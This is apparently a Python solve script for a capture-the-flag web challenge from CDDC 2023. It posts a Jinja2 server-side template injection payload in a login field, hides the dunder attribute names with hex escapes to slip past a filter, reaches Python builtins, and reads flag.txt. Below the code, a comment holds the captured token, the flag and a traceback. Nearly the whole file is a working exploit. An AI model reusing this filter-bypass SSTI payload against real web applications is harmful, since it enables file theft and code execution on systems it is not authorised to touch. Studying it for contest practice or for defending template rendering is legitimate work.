import requests
import json
import html
import os
import re

cwd = os.path.dirname(os.path.realpath(__file__))

server = "18.139.37.47:28466"
# server = "localhost:5000"
login = f"http://{server}/login"
home = f"http://{server}/home"

pattern = r"\[(.*?)\]"

payload = """
{"user_id":"{{''|attr('\\\\x5F\\\\x5Fclass\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fbase\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F')()|attr('\\\\x5F\\\\x5Fgetitem\\\\x5F\\\\x5F')(437)|attr('\\\\x5F\\\\x5Finit\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fglo'+'bals\\\\x5F\\\\x5F')}}","user_pw":"eee"}
"""

payload = """
{"user_id":"{{''|attr('\\\\x5F\\\\x5Fclass\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fbase\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fsubclasses\\\\x5F\\\\x5F')()|attr('\\\\x5F\\\\x5Fgetitem\\\\x5F\\\\x5F')(440)|attr('\\\\x5F\\\\x5Finit\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fglo'+'bals\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fgetitem\\\\x5F\\\\x5F')('\\\\x5F\\\\x5Fbuiltins\\\\x5F\\\\x5F')|attr('\\\\x5F\\\\x5Fgetitem\\\\x5F\\\\x5F')('op'+'en')('flag\\\\x2etxt','r')|attr('read')()}}","user_pw":"eee"}
"""

# .to_bytes(1, byteorder='little').decode()
headers = {
    'Content-Type' : 'application/json'
}

r = requests.post(login, headers=headers, data=payload)

print(html.unescape(html.unescape(r.text)))

cookies = {
    "token" : json.loads(r.text)['access_token']
}

r = requests.get(home, cookies=cookies)
print(r.text)
match = re.search(pattern, html.unescape(r.text))

if match:
    extracted_value = match.group(1)
    print(extracted_value)

split = extracted_value.split(', ')
print(len(split))
with open(cwd + "/gadgets.txt", 'w') as f:
    for g in split:
        f.write(g + "\n")

'''
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6Int7Jyd8YXR0cignXFx4NUZcXHg1RmNsYXNzXFx4NUZcXHg1RicpfGF0dHIoJ1xceDVGXFx4NUZiYXNlXFx4NUZcXHg1RicpfGF0dHIoJ1xceDVGXFx4NUZzdWJjbGFzc2VzXFx4NUZcXHg1RicpKCl8YXR0cignXFx4NUZcXHg1RmdldGl0ZW1cXHg1RlxceDVGJykoNDQwKXxhdHRyKCdcXHg1RlxceDVGaW5pdFxceDVGXFx4NUYnKXxhdHRyKCdcXHg1RlxceDVGZ2xvJysnYmFsc1xceDVGXFx4NUYnKXxhdHRyKCdcXHg1RlxceDVGZ2V0aXRlbVxceDVGXFx4NUYnKSgnXFx4NUZcXHg1RmJ1aWx0aW5zXFx4NUZcXHg1RicpfGF0dHIoJ1xceDVGXFx4NUZnZXRpdGVtXFx4NUZcXHg1RicpKCdvcCcrJ2VuJykoJ2ZsYWdcXHgyZXR4dCcsJ3InKXxhdHRyKCdyZWFkJykoKX19IiwiZXhwIjoxNjg3NTAwMDg4fQ.jbI0Ichr6qHks5id6S67JCCI-hOSfQ-lmt_2ICIQ0gA","result":"success"}       


  <h1/> Welcome! CDDC2023{It_is_time_to_wear_the_holo_lens} </h1>
Traceback (most recent call last):
  File "c:\Users\tianb\Downloads\CDDC_finals\web_child\solve.py", line 45, in <module>
    split = extracted_value.split(', ')
NameError: name 'extracted_value' is not defined
'''